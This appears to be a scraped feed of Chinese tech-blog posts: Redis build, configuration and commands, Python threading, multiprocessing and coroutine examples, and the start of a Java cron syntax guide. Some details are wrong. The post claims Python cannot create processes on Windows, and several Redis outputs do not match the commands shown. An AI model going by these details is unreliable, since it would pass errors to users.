Allocator---------------------------------------------------------------------------------------------------------Selecting a non-default memory allocator when building Redis is done by settingthe `MALLOC` environment variable. Redis is compiled and linked against libcmalloc by default, with the exception of jemalloc being the default on Linuxsystems. This default was picked because jemalloc has proven to have fewerfragmentation problems than libc malloc.To force compiling against libc malloc, use:% make MALLOC=libcTo compile against jemalloc on Mac OS X systems, use:% make MALLOC=jemalloc allocator（分配算符），如果有MALLOC这个环境变量，会有用这个环境变量的 去建立Redis。而且libc 并不是默认的分配器，默认的是jemalloc！因为jemalloc被证明有更少的fragmentation problems比libc。 但是如果你又没有jemalloc 而只有 libc 当然 make 出错。 所以加这么一个参数。make MALLOC=libc--------------------------------------------------------------------------------------------------------- 配置redis12345#复制管理脚本cp /opt/redis-3.0.4/utils/redis_init_script /etc/init.d/redis chmod +x /etc/init.d/redismkdir /etc/rediscp /opt/redis-3.0.4/redis.conf /etc/redis/6379.conf 修改redis启动模式123#默认Redis启动的时候是启动在前台的，把他改为启动在后台vim /etc/redis/6379.confdaemonize no 改为 daemonize yes 开机启动12345678910#首先修改Redis启动脚本：vim /etc/init.d/redis#chkconfig: 35 95 95 在第三行加上即可 #添加系统服务：chkconfig --add redis#设置开机启动：chkconfig redis on#检查服务状态：chkconfig --list redis 指定日志存放位置&amp;PID文件&amp;数据库文件存放位置（下一边写持久化）123456789vim /etc/redis/6379.conf logfile "/var/log/redis.log" #指定日志文件如果不指定就会在控制台输出pidfile /var/run/redis_6379.piddir ./ #这个是指默认的持久化配置文件放在那里！建议修改下！ #pidfile如果不修改使用默认的话就会报错：#原因是在/etc/init.d/redis里指定的默认PID是：PIDFILE=/var/run/redis_$&#123;REDISPORT&#125;.pid #但是默认配置文件：/etc/redis/6379.conf（咱们自己从解压包里复制的里的默认是：pidfile /var/run/redis.pid） 基本操作123456SET 设置KeyGET 判断Key的值EXISTS 判断Key是否存在KEYS * 显示所有的KeyDEL 删除指定KeyTYPE 获取Key类型 注：Redis是不区分大小写的，命令最好使用大写这样能区分是命令还是参数！ set的例子：1234192.168.0.201:6379&gt; SET hello heheOK192.168.0.201:6379&gt; GET hello"hehe" 设置多个key value 然后使用使用keys * 去查看所有12345678910111213192.168.0.201:6379&gt; SET hello1 hehe1OK192.168.0.201:6379&gt; SET hello2 hehe2OK 192.168.0.201:6379&gt; KEYS *1) "hello1"2) "hello"3) "hello2" #KEY匹配方式：？匹配单个 *匹配所有 判断key是否存在12345#判断Key是否存在使用：EXISTS 他返回的是整形：0不存在，1存在192.168.0.201:6379&gt; EXISTS hello(integer) 1192.168.0.201:6379&gt; EXISTS hehe(integer) 0 删除KEY12345192.168.0.201:6379&gt; DEL hello(integer) 1 #这里的1是数量#删除多个测试下：192.168.0.201:6379&gt; DEL hello1 hello2(integer) 2 查看类型TYPE123#只要用set类型就是字符串。查看类型命令用TYPE192.168.0.201:6379&gt; TYPE hellostring Keyspace1234567891011121314#redis是支持多个实例的默认最多16个，可以修改配置文件来支持更多！#使用INFO命令查看！# Keyspacedb0:keys=1,expires=0,avg_ttl=0 #db0 ：这个可以理解为命名空间。最多支持16个，使用SELECT 去切换192.168.0.201:6379&gt; SELECT 1OK#尝试添加一个key-valueSET db1 hehe#然后在使用INFO看下# Keyspacedb0:keys=1,expires=0,avg_ttl=0db1:keys=1,expires=0,avg_ttl=0 Redis数据类型：他用不同的命令来区分你要操作什么数据类型类型不能嵌套，不能混！ 但是有个王炸：set能把所有的类型都改为字符串类型！ 字符串类型：123456789101112131415161718192021222324252627282930SETGETDELAPPEND 在值的后面追加set能重新设置但是要追加的话使用APPEND最好比如192.168.0.201:6379&gt; SET hehe helloOK192.168.0.201:6379&gt; GET hehe"hello"192.168.0.201:6379&gt; APPEND hehe ,world(integer) 11192.168.0.201:6379&gt; GET hehe"hello,world" 可以同时设置多个值和查询值用MSET 和MSET192.168.0.201:6379&gt; MSET key1 v1 key2 v2 key3 v3OK192.168.0.201:6379&gt; MGET key1 key2 key31) "v1"2) "v2"3) "v3" 获取字符串长度192.168.0.201:6379&gt; STRLEN hehe(integer) 11如果字符串是中文的他会按照UTF-8格式的来输出1个字等3个字符串来算的 )192.168.0.201:6379&gt; SET key "呵呵"OK192.168.0.201:6379&gt; GET key"\xe5\x91\xb5\xe5\x91\xb5" 自增类型12345678910111213141516171819202122232425262728293031323334353637383940414243444546#比如说投票点下+1 ，如果说用set每点一次修改set下那就不太现实。所有redis有个自增类型：INCR192.168.0.201:6379&gt; INCR num #默认如果没有这个值的话，INCR就会自动创建一个值默认为零，当你没执行一次他就会+1(integer) 1192.168.0.201:6379&gt; INCR num(integer) 2192.168.0.201:6379&gt; INCR num(integer) 3192.168.0.201:6379&gt; INCR num(integer) 4 #如果想加多个呢：INCRBY192.168.0.201:6379&gt; INCRBY num 10(integer) 57192.168.0.201:6379&gt; INCRBY num 10(integer) 67192.168.0.201:6379&gt; INCRBY num 10(integer) 77 #减呢？ DECR192.168.0.201:6379&gt; DECR num(integer) 106192.168.0.201:6379&gt; DECR num(integer) 105192.168.0.201:6379&gt; DECR num(integer) 104 #如果要是减多个呢：DECRBY192.168.0.201:6379&gt; DECRBY num 5(integer) 97192.168.0.201:6379&gt; DECRBY num 5(integer) 92192.168.0.201:6379&gt; DECRBY num 5(integer) 87 #想支持小数点：INCRBYFLOAT key 0.1192.168.0.201:6379&gt; INCRBYFLOAT key 0.1"0.1"192.168.0.201:6379&gt; INCRBYFLOAT key 0.1"0.2"192.168.0.201:6379&gt; INCRBYFLOAT key 0.1"0.3"192.168.0.201:6379&gt; INCRBYFLOAT key 0.1"0.4" 散列类型（hash）123456789101112131415161718192021222324252627282930313233343536#和数据库存的表似的，表不是的有字段吧，可以给每个字段设置个值HSET Key field valueHGET Key fieldHMSET Key field value [field value....]HMGET Key field [field ...]HGETALL KeyHDEL 192.168.0.201:6379&gt; HSET shouji name iphone(integer) 1192.168.0.201:6379&gt; HSET shouji co red(integer) 1192.168.0.201:6379&gt; HSET shouji price 8888(integer) 1 192.168.0.201:6379&gt; HGET shouji name"iphone"192.168.0.201:6379&gt; HGET shouji co"red"192.168.0.201:6379&gt; HGET shouji price"8888"192.168.0.201:6379&gt; HGETALL shouji1) "name"2) "iphone"3) "co"4) "red"5) "price"6) "8888" #其实现在看着不是好看的但是他通过一些API调用到网页上，通过排版取出来的值就好看了192.168.0.201:6379&gt; HMSET diannao name thinkpad co black price 30OK192.168.0.201:6379&gt; HMGET diannao name co price1) "thinkpad"2) "black"3) "30" 列表类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#列表类型：他是存储一个有序的字符串列表 这个“有序”是什么时候进来的！ #列表你向左边添加和右边添加他的时间复杂度是一样的！O1（时间复杂度）#可以理解为：我这个速度不随着数量的增加而增加！比如1000行和1万行他的时间开销是一样的！ 大学数据结构里学的 #时间复杂度：#同一问题可用不同算法解决，而一个算法的质量优劣将影响到算法乃至程序的效率。算法分析的目的在于选择合适算法和改进算法。#计算机科学中，算法的时间复杂度是一个函数，它定量描述了该算法的运行时间。 #但是他有个缺点，比如说里面有1万个key你想找到第98个这就费老劲了他从1开始数数到98#优点，你读前100个，卡直接读头部就非常快了 #命令：LPUSH key value [value ...]RPUSH key value [value ...] LPOP key RPOP key LRANGE key start stop LREM key count value#从左边添加key192.168.0.201:6379&gt; LPUSH num 0(integer) 1192.168.0.201:6379&gt; LPUSH num 1(integer) 2192.168.0.201:6379&gt; LPUSH num 2(integer) 3 #现在是从左边加2 1 0 #从右边开始加192.168.0.201:6379&gt; RPUSH num 3(integer) 42 1 0 3 192.168.0.201:6379&gt; RPUSH num 5(integer) 5 2 1 0 3 5 5 #如果想获取长度就使用LNE 吗！获取列表类型长度就是：LLEN192.168.0.201:6379&gt; LLEN num(integer) 5 #从左边拿key#从列表类型里拿出这个key来（拿出来就没有了），从左边拿左边第一个192.168.0.201:6379&gt; LPOP num"2" #左边第一个是2那么拿出来之后这个key这个key就变成1 0 3 5 #从右边拿key，从右边拿右边第一个 （这个5就被拿出来了）192.168.0.201:6379&gt; RPOP num"5" #现在在看下这个key的长度192.168.0.201:6379&gt; LLEN num(integer) 3 #获取列表的某一个范围：#现在是这个值1 0 3 192.168.0.201:6379&gt; LRANGE num 0 1 #取0 - 1 的值1) "1"2) "0" ###这个列表和python中列表中差不多，0 -1 相当于列表中的下标。 192.168.0.201:6379&gt; LPUSH num 2(integer) 4192.168.0.201:6379&gt; RPUSH num 4(integer) 5 192.168.0.201:6379&gt; LRANGE num 0 -1 #这里的（-1）表示左边第一个1) "2"2) "1"3) "0"4) "3"5) "4" #获取指定元素的值 #获取右边的第一个值：192.168.0.201:6379&gt; LINDEX num -1"4"#获取左边边的第二个值：192.168.0.201:6379&gt; LINDEX num -2"3" #那-3呢？192.168.0.201:6379&gt; LINDEX num -3"0"#这个就是从右边数的第3个值！！！！！ #从左边获取值192.168.0.201:6379&gt; LINDEX num 0"2"192.168.0.201:6379&gt; LINDEX num 1"1" #他是两边的第一次接触有点乱！他是两边的需要注意！！！ #只保留指定数据 #只保留0到2的数据192.168.0.201:6379&gt; LTRIM num 0 2OK#看下结果：192.168.0.201:6379&gt; LRANGE num 0 -11) "2"2) "1"3) "0" #这个有什么用呢：#写日志的时候，我这个缓冲区，只保留最近100条日志！#比如：192.168.0.201:6379&gt; LPUSH logs newloghehe(integer) 1 192.168.0.201:6379&gt; LTRIM num 0 99OK 这样的话我的列表永远只有100条，我只看最近100条的日志！！ 集合类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#集合是高一学的，第一个学期就是学的集合#交集∩、并集∪、合集、等 0 0 ！ #集合的元素是没有类型的！#用到集合类型的应用有：（新浪微博分享了很多的redis应用）#比如：关注微博，比如咱俩是否共同关注了某一个人等。 #添加集合192.168.0.201:6379&gt; SADD jihe1 a b c(integer) 3#查看集合内容192.168.0.201:6379&gt; SMEMBERS jihe11) "c"2) "a"3) "b"#判断集合元素是否存在192.168.0.201:6379&gt; SISMEMBER jihe1 d(integer) 0192.168.0.201:6379&gt; SISMEMBER jihe1 a(integer) 1返回0 说明不存在返回1说明存存在 #集合间运算#支持：交集、差集、并集 #差集运算：192.168.0.201:6379&gt; SDIFF jihe1 jihe21) "a"jihe1abcjihe2b cd jihe1 减去jihe2 减去相同的b c , jihe1 还剩下a 同理：jihe2 减去jihe1192.168.0.201:6379&gt; SDIFF jihe2 jihe11) "d" #差集运算可以设置多个 #交集运算： 192.168.0.201:6379&gt; SINTER jihe1 jihe21) "c"2) "b" #交集可以设置多个：#在添加一个jihe3192.168.0.201:6379&gt; SADD jihe3 d e f(integer) 3 192.168.0.201:6379&gt; SINTER jihe1 jihe2 jihe3(empty list or set)#这个是因为他是jihe1和jihe2先做交集运算，然后在和jihe3做交集运算 #并集运算192.168.0.201:6379&gt; SUNION jihe1 jihe21) "a"2) "c"3) "b"4) "d"#同样也可以设置多个 #以上的集合是无序的，redis支持有序的集合他的名如下ZADD key score member 增加元素ZSCORE key member 获取元素的分数ZRANGE key start stop [WITHSCORES]ZRANGEBYSCORE key min max #添加有序集合192.168.0.201:6379&gt; ZSCORE youxu 80 a(nil)192.168.0.201:6379&gt; ZADD youxu 81 b(integer) 1#可以添加多个192.168.0.201:6379&gt; ZADD youxu 82 c 83 d(integer) 2 #获取分数192.168.0.201:6379&gt; ZSCORE youxu a"80"192.168.0.201:6379&gt; ZSCORE youxu b"81"192.168.0.201:6379&gt; ZSCORE youxu c"82"192.168.0.201:6379&gt; ZSCORE youxu d"83" #获取有序集合范围192.168.0.201:6379&gt; ZRANGE youxu 0 3 #参考列表集合的0 3 从0到3的元素1) "a"2) "b"3) "c"4) "d" #在举个例子：192.168.0.201:6379&gt; ZADD youxu 79 e(integer) 1 192.168.0.201:6379&gt; ZRANGE youxu 0 41) "e"2) "a"3) "b"4) "c"5) "d]]></content>
      <categories>
        <category>数据库运维</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python之进程线程协程]]></title>
    <url>%2Farticles%2Ffa6bf072.html</url>
    <content type="text"><![CDATA[Socket Server模块SocketServer内部使用 IO多路复用 以及 “多线程” 和 “多进程” ，从而实现并发处理多个客户端请求的Socket服务端。即：每个客户端请求连接到服务器时，Socket服务端都会在服务器是创建一个“线程”或者“进程” 专门负责处理当前客户端的所有请求。 socket server和select &amp; epoll 还是不太一样他的本质是：客户端第一次链接的时候，只要一进来，我服务端有个while循环为你创建一个线程和进程，客户端就和服务端直接创建通信，以后传送数据什么的就不会通过server端了，直接他俩通过线程或者进程通信就可以了！ 如果在多进程的时候，client1和client2他们同时传输10G的文件都是互相不影响！如果在多线程的时候，python中的多线程，在同一时间只有一个线程在工作，他底层会自动进行上下文切换，client1传一点，client2传一点。 知识回顾：python中的多线程，有一个GIL在同一时间只有一个线程在工作，他底层会自动进行上下文切换.这样会导致python的多线程效率会很低，也就是人们经常说的python多线程问题 如下图： 第一次连接后，数据通讯就通过线程或进程进行数据交换（红色箭头） ThreadingTCPServerThreadingTCPServer实现的Socket服务器内部会为每个client创建一个 “线程”，该线程用来和客户端进行交互。 ThreadingTCPServer基础使用ThreadingTCPServer: 创建一个继承自 SocketServer.BaseRequestHandler 的类 类中必须定义一个名称为 handle 的方法 启动ThreadingTCPServer 123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding:utf-8 -*-import SocketServerclass MyServer(SocketServer.BaseRequestHandler): def handle(self): #定义handle方法 # print self.request,self.client_address,self.server conn = self.request #如果连接请求过来，获取client端对象 conn.sendall('欢迎致电 10086，请输入1xxx,0转人工服务.') #发送一个信息 Flag = True #并把Flag设置为True while Flag:当Flag为True的时候执行 data = conn.recv(1024) #接收client端数据 if data == 'exit': #判断如果data == 'exit' 退出 Flag = False #并把Flag设置为Flase elif data == '0': #如果为 == ‘0’ conn.sendall('通过可能会被录音.balabala一大推') #发送数据 else:#上面的都没匹配上，发送请重新输入 conn.sendall('请重新输入.') if __name__ == '__main__': server = SocketServer.ThreadingTCPServer(('127.0.0.1',8009),MyServer) #实例化对象，设置启动的IP/PORT并把自己定义的类写上作为SocketServer.ThreadingTCPServer的构造函数 server.serve_forever() #调用对象中的启动方法 1234567891011121314151617181920#!/usr/bin/env python# -*- coding:utf-8 -*-import socketip_port = ('127.0.0.1',8009)sk = socket.socket()sk.connect(ip_port)sk.settimeout(5)while True: data = sk.recv(1024) print 'receive:',data inp = raw_input('please input:') sk.sendall(inp) if inp == 'exit': breaksk.close() ThreadingTCPServer源码剖析 学会看源码非常重要！不能仅仅光会用！大赞~ 知道他的过程和实现~ 怎么学会看源码呢？多看然后画类图，如上图！！！ 在理解的时候可以把他们想象为，把所有需要用的方法，都抓到ThreadingTCPServer中 内部调用流程为： 启动服务端程序 执行 TCPServer.init 方法，创建服务端Socket对象并绑定 IP 和 端口 执行 BaseServer.init 方法，将自定义的继承自SocketServer.BaseRequestHandler 的类 MyRequestHandle赋值给 self.RequestHandlerClass 执行 BaseServer.server_forever 方法，While 循环一直监听是否有客户端请求到达 … 当客户端连接到达服务器 执行 ThreadingMixIn.process_request 方法，创建一个 “线程” 用来处理请求 执行 ThreadingMixIn.process_request_thread 方法 执行 BaseServer.finish_request 方法，执行 self.RequestHandlerClass() 即：执行 自定义 MyRequestHandler 的构造方法（自动调用基类BaseRequestHandler的构造方法，在该构造方法中又会调用 MyRequestHandler的handle方法） 精简源码： 模拟Socekt Server的简化版本： 12345678910111213141516171819202122232425262728293031323334import socketimport threadingimport selectdef process(request, client_address): #模拟定义的handle()方法，这个方法内的代码是socket server与Client端交互代码 print request,client_address conn = request conn.sendall('欢迎致电 10086，请输入1xxx,0转人工服务.') flag = True while flag: data = conn.recv(1024) if data == 'exit': flag = False elif data == '0': conn.sendall('通过可能会被录音.balabala一大推') else: conn.sendall('请重新输入.')sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sk.bind(('127.0.0.1',8002))sk.listen(5)while True: #这里一个while循环循环监控sk文件句柄 r, w, e = select.select([sk,],[],[],1) print 'looping' if sk in r: #当sk文件句柄发生变化的时候说明是新的客户端连接过来了 print 'get request' request, client_address = sk.accept() t = threading.Thread(target=process, args=(request, client_address)) #创建一个线程，并调用自己定义的process方法执行~然后样客户端与之交互 t.daemon = False t.start()sk.close() 如精简代码可以看出，SocketServer的ThreadingTCPServer之所以可以同时处理请求得益于 select 和 Threading 两个东西，其实本质上就是在服务器端为每一个客户端创建一个线程，当前线程用来处理对应客户端的请求，所以，可以支持同时n个客户端链接（长连接）。 ForkingTCPServer ForkingTCPServer和ThreadingTCPServer的使用和执行流程基本一致，只不过在内部分别为请求者建立 “线程” 和 “进程”。 123456789101112131415161718192021222324#!/usr/bin/env python# -*- coding:utf-8 -*-import SocketServerclass MyServer(SocketServer.BaseRequestHandler): def handle(self): # print self.request,self.client_address,self.server conn = self.request conn.sendall('欢迎致电 10086，请输入1xxx,0转人工服务.') Flag = True while Flag: data = conn.recv(1024) if data == 'exit': Flag = False elif data == '0': conn.sendall('通过可能会被录音.balabala一大推') else: conn.sendall('请重新输入.')if __name__ == '__main__': server = SocketServer.ForkingTCPServer(('127.0.0.1',8009),MyServer) server.serve_forever() 1234567891011121314151617181920#!/usr/bin/env python# -*- coding:utf-8 -*-import socketip_port = ('127.0.0.1',8009)sk = socket.socket()sk.connect(ip_port)sk.settimeout(5)while True: data = sk.recv(1024) print 'receive:',data inp = raw_input('please input:') sk.sendall(inp) if inp == 'exit': breaksk.close() 以上ForkingTCPServer只是将 ThreadingTCPServer 实例中的代码： 123server = SocketServer.ThreadingTCPServer(('127.0.0.1',8009),MyRequestHandler)变更为：server = SocketServer.ForkingTCPServer(('127.0.0.1',8009),MyRequestHandler) Python线程Threading用于提供线程相关的操作，线程是应用程序中工作的最小单元。 1234567891011121314#!/usr/bin/env python# -*- coding:utf-8 -*-import threadingimport time def show(arg): time.sleep(2) print 'thread'+str(arg) for i in range(10): t = threading.Thread(target=show, args=(i,)) #这里实例化对象的时候传的两个参数第一个参数是，线程需要执行的方法，第二个参数方法的参数 t.start() print 'main thread stop' 上述代码创建了10个“前台”线程，然后控制器就交给了CPU，CPU根据指定算法进行调度，分片执行指令。 再次回顾：这里为什么是分片执行？ python中的多线程，有一个GIL（Global Interpreter Lock 全局解释器锁 ）在同一时间只有一个线程在工作，他底层会自动进行上下文切换.这个线程执行点，那个线程执行点！ 更多方法： start 线程准备就绪，等待CPU调度 setName 为线程设置名称 getName 获取线程名称 setDaemon 设置为后台线程或前台线程（默认） ​ 如果是后台线程，主线程执行过程中，后台线程也在进行，主线程执行完毕后，后台线程不论成功与否，均停止 ​ 如果是前台线程，主线程执行过程中，前台线程也在进行，主线程执行完毕后，等待前台线程也执行完成后，程序停止 join 逐个执行每个线程，执行完毕后继续往下执行，该方法使得多线程变得无意义 run 线程被cpu调度后执行Thread类对象的run方法 线程锁 由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，CPU接着执行其他线程。所以，可能出现如下问题： 123456789101112131415161718#!/usr/bin/env python# -*- coding:utf-8 -*-import threadingimport timegl_num = 0def show(arg): global gl_num time.sleep(1) gl_num +=1 print gl_numfor i in range(10): t = threading.Thread(target=show, args=(i,)) t.start()print 'main thread stop' 设置线程锁 123456789101112131415161718192021#!/usr/bin/env python#coding:utf-8 import threadingimport time gl_num = 0 lock = threading.RLock() #实例化调用线程锁 def Func(): lock.acquire() #获取线程锁 global gl_num gl_num +=1 time.sleep(1) print gl_num lock.release() #释放线程锁，这里注意，在使用线程锁的时候不能把锁，写在代码中，否则会造成阻塞，看起来“像”单线程 for i in range(10): t = threading.Thread(target=Func) t.start() event 他的作用就是：用主线程控制子线程合适执行，他可以让子线程停下来，也可以让线程继续！他实现的机制就是：标志位“Flag” 事件处理的机制：全局定义了一个“Flag”，如果“Flag”值为 False，那么当程序执行 event.wait 方法时就会阻塞，如果“Flag”值为True，那么event.wait 方法时便不再阻塞。 clear：将“Flag”设置为False set：将“Flag”设置为True 12345678910111213141516171819202122232425#!/usr/bin/env python# -*- coding:utf-8 -*- import threading def do(event): print 'start' event.wait() #执行对象weit方法，然后他们停下来，等待“Flag”为True print 'execute' event_obj = threading.Event() #创建事件的对象for i in range(10): t = threading.Thread(target=do, args=(event_obj,)) #吧对象传到每个线程里面了~ t.start() event_obj.clear() #设置"Flag"为Flaseinp = raw_input('input:')if inp == 'true': event_obj.set() #thread enent 就是这个3个方法的使用 Python进程12345678910from multiprocessing import Processimport threadingimport time def foo(i): print 'say hi',i for i in range(10): p = Process(target=foo,args=(i,)) p.start() 注意：由于进程之间的数据需要各自持有一份，所以创建进程需要的非常大的开销。并且python不能再Windows下创建进程！ 并且在使用多进程的时候，最好是创建多少个进程？：和CPU核数相等 默认的进程之间相互是独立，如果想让进程之间数据共享，就得有个特殊的数据结构，这个数据结构就可以理解为他有穿墙的功能如果你能穿墙的话两边就都可以使用了使用了3种方法 默认的进程无法进行数据共享： 12345678910111213141516171819#!/usr/bin/env python#coding:utf-8 from multiprocessing import Processfrom multiprocessing import Manager import time li = [] def foo(i): li.append(i) print 'say hi',li for i in range(10): p = Process(target=foo,args=(i,)) p.start() print 'ending',li 使用特殊的数据类型，来进行穿墙： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647默认的进程之间相互是独立，如果想让进程之间数据共享，就得有个特殊的数据结构，这个数据结构就可以理解为他有穿墙的功能如果你能穿墙的话两边就都可以使用了使用了3种方法第一种方法：#通过特殊的数据结构：数组（Array）from multiprocessing import Process,Array#创建一个只包含数字类型的数组（python中叫列表）#并且数组是不可变的，在C，或其他语言中，数组是不可变的，之后再python中数组（列表）是可以变得#当然其他语言中也提供可变的数组#在C语言中数组和字符串是一样的，如果定义一个列表，如果可以增加，那么我需要在你内存地址后面再开辟一块空间，那我给你预留多少呢？#在python中的list可能用链表来做的，我记录了你前面和后面是谁。 列表不是连续的，数组是连续的'''上面不是列表是“数组"数组是不可变的，附加内容是为了更好的理解数组！'''temp = Array('i', [11,22,33,44]) #这里的i是C语言中的数据结构，通过他来定义你要共享的内容的类型！点进去看~ def Foo(i): temp[i] = 100+i for item in temp: print i,'-----&gt;',item for i in range(2): p = Process(target=Foo,args=(i,)) p.start() 第二种方法：#方法二：manage.dict()共享数据from multiprocessing import Process,Manager #这个特殊的数据类型Manager manage = Manager()dic = manage.dict() #这里调用的时候，使用字典，这个字典和咱们python使用方法是一样的！ def Foo(i): dic[i] = 100+i print dic.values() for i in range(2): p = Process(target=Foo,args=(i,)) p.start() p.join() OK那么问题来了，既然进程之间可以进行共享数据，如果多个进程同时修改这个数据是不是就会造成脏数据？是不是就得需要锁！ 进程的锁和线程的锁使用方式是非常一样的知识他们是用的类是在不同地方的 123456789101112131415161718192021#!/usr/bin/env python# -*- coding:utf-8 -*-from multiprocessing import Process, Array, RLockdef Foo(lock,temp,i): """ 将第0个数加100 """ lock.acquire() temp[0] = 100+i for item in temp: print i,'-----&gt;',item lock.release()lock = RLock()temp = Array('i', [11, 22, 33, 44])for i in range(20): p = Process(target=Foo,args=(lock,temp,i,)) p.start() 进程池 进程池内部维护一个进程序列，当使用时，则去进程池中获取一个进程，如果进程池序列中没有可供使用的进进程，那么程序就会等待，直到进程池中有可用进程为止。 进程池中有两个方法： apply apply_async 12345678910111213141516171819202122232425262728#!/usr/bin/env python# -*- coding:utf-8 -*-from multiprocessing import Process,Poolimport time def Foo(i): time.sleep(2) return i+100 def Bar(arg): print arg pool = Pool(5) #创建一个进程池#print pool.apply(Foo,(1,))#去进程池里去申请一个进程去执行Foo方法#print pool.apply_async(func =Foo, args=(1,)).get() for i in range(10): pool.apply_async(func=Foo, args=(i,),callback=Bar) print 'end'pool.close()pool.join()#进程池中进程执行完毕后再关闭，如果注释，那么程序直接关闭。'''apply 主动的去执行pool.apply_async(func=Foo, args=(i,),callback=Bar) 相当于异步，当申请一个线程之后，执行FOO方法就不管了，执行完之后就在执行callback ，当你执行完之后，在执行一个方法告诉我执行完了callback 有个函数，这个函数就是操作的Foo函数的返回值！''' 协程首先要明确，线程和进程都是系统帮咱们开辟的，不管是thread还是process他内部都是调用的系统的API而对于协程来说它和系统毫无关系！他就和程序员有关系，对于线程和进程来说，调度是由CPU来决定调度的！对于协程来说，程序员就是上帝，你想让谁执行到哪里他就执行到哪里 协程存在的意义：对于多线程应用，CPU通过切片的方式来切换线程间的执行，线程切换时需要耗时（保存状态，下次继续）。协程，则只使用一个线程，在一个线程中规定某个代码块执行顺序。 适用场景：其实在其他语言中，协程的其实是意义不大的多线程即可已解决I/O的问题，但是在python因为他有GIL（Global Interpreter Lock 全局解释器锁 ）在同一时间只有一个线程在工作，所以：如果一个线程里面I/O操作特别多，协程就比较适用 greenlet 123456789101112131415161718192021222324252627282930313233343536373839404142收先要明确，线程和进程都是系统帮咱们开辟的，不管是thread还是process他内部都是调用的系统的API而对于协程来说它和系统毫无关系！他就和程序员有关系，对于线程和进程来说，是不是有CPU来决定调度的！对于协程来说，程序员就是上帝，你想让谁执行到哪里他就执行到哪里#!/usr/bin/env python# -*- coding:utf-8 -*- from greenlet import greenlet def test1(): print 12 gr2.switch()#切换到协程2执行 print 34 #2切回来之后，在这里和yield类似 gr2.switch() def test2(): print 56 gr1.switch()#上面执行了一句，在切换到协程1里去了 print 78 gr1 = greenlet(test1) #创建了一个协程gr2 = greenlet(test2)gr1.switch() #执行test1 '''比I/O操作，如果10个I/O，我程序从上往下执行，如果同时发出去了10个I/O操作，那么返回的结果如果同时回来了2个，是不是就节省了很多时间？如果一个线程里面I/O操作特别多，使用协程是不是就非常适用了！如果一个线程访问URL通过协程来做，协程告诉它你去请求吧，然后继续执行，但是如果不用协程就得等待第一个请求完毕之后返回之后才继续下一个请求。协程：把一个线程分成了多个协程操作，每个协程做操作多线程：是把每一个操作，分为多个线程做操作，但是python中，在同一时刻只能有一个线程操作，并且有上下文切换。但是如果上下文切换非常频繁的话是非常耗时的，但对于协程切换就非常轻便了~''' 协程就是对线程的分片，上面的例子需要手动操作可能用处不是很大了解原理，看下面的例子： 上面的greenlet是需要认为的制定调度顺序的，所以又出了一个gevent他是对greenlet功能进行封装 遇到I/O自动切换 123456789101112131415161718192021from gevent import monkey; monkey.patch_all()import geventimport urllib2def f(url): print('GET: %s' % url) resp = urllib2.urlopen(url) #当遇到I/O操作的时候就会调用协程操作，然后继续往下走，然后这个协程就卡在这里等待数据的返回 data = resp.read() print('%d bytes received from %s.' % (len(data), url))gevent.joinall([ gevent.spawn(f, 'https://www.python.org/'), #这里的f是调用这个方法，第二个是调用方的参数 gevent.spawn(f, 'https://www.yahoo.com/'), gevent.spawn(f, 'https://github.com/'),]) '''gevent.spawn(f, 'https://www.python.org/'), #这里的f是调用这个方法，第二个是调用方的参数当函数f里的代码遇到I/O操作的时候，函数就卡在哪里等待数据的返回，但是协程不会等待而是继续操作!''']]></content>
      <categories>
        <category>运维开发</category>
        <category>语言积累</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java定时器设定详解]]></title>
    <url>%2Farticles%2Fd0e68aab.html</url>
    <content type="text"><![CDATA[背景本文通过实例详细介绍了Java定时和linux通用的crontab之间的差异。 语法这些星号由左到右按顺序代表 ： * * * * * * * 格式: [秒] [分] [小时] [日] [月] [周] [年] 序号说明是否必填 允许填写的值 允许的通配符 123456789101112131 秒 是 0-59 , - * /2 分 是 0-59 , - * /3 小时 是 0-23 , - * /4 日 是 1-31 , - * ? / L W5 月 是 1-12 or JAN-DEC , - * /6 周 是 1-7 or SUN-SAT , - * ? / L #7 年 否 empty 或 1970-2099 , - * / 通配符12345678910111213141516171819202122* 表示所有值. 例如:在分的字段上设置 "*",表示每一分钟都会触发。? 表示不指定值。使用的场景为不需要关心当前设置这个字段的值。例如:要在每月的10号触发一个操作，但不关心是周几，所以需要周位置的那个字段设置为"?" 具体设置为 0 0 0 10 * ?- 表示区间。例如 在小时上设置 "10-12",表示 10,11,12点都会触发。, 表示指定多个值，例如在周字段上设置 "MON,WED,FRI" 表示周一，周三和周五触发/ 用于递增触发。如在秒上面设置"5/15" 表示从5秒开始，每增15秒触发(5,20,35,50)。在月字段上设置'1/3'所示每月1号开始，每隔三天触发一次。一般不写的话，默认递增为基本单位，如1分钟，1秒钟L 表示最后的意思。在日字段设置上，表示当月的最后一天(依据当前月份，如果是二月还会依据是否是润年[leap]), 在周字段上表示星期六，相当于"7"或"SAT"。如果在"L"前加上数字，则表示该数据的最后一个。例如在周字段上设置"6L"这样的格式,则表示“本月最后一个星期五"W 表示离指定日期的最近那个工作日(周一至周五). 例如在日字段上设置"15W"，表示离每月15号最近的那个工作日触发。如果15号正好是周六，则找最近的周五(14号)触发, 如果15号是周未，则找最近的下周一(16号)触发.如果15号正好在工作日(周一至周五)，则就在该天触发。如果指定格式为 "1W",它则表示每月1号往后最近的工作日触发。如果1号正是周六，则将在3号下周一触发。(注，"W"前只能设置具体的数字,不允许区间"-").小提示'L'和 'W'可以一组合使用。如果在日字段上设置"LW",则表示在本月的最后一个工作日触发(一般指发工资 )\# 序号(表示每月的第几个周几)，例如在周字段上设置"6#3"表示在每月的第三个周六.注意如果指定"#5",正好第五周没有周六，则不会触发该配置(用在母亲节和父亲节再合适不过了)小提示周字段的设置，若使用英文字母是不区分大小写的 MON 与mon相同. 示例:123456789101112131415161718192021222324252627282930313233343536370 0 12 * * ? 每天12点触发0 15 10 ? * * 每天10点15分触发0 15 10 * * ? 每天10点15分触发0 15 10 * * ? * 每天10点15分触发0 15 10 * * ? 2005 2005年每天10点15分触发0 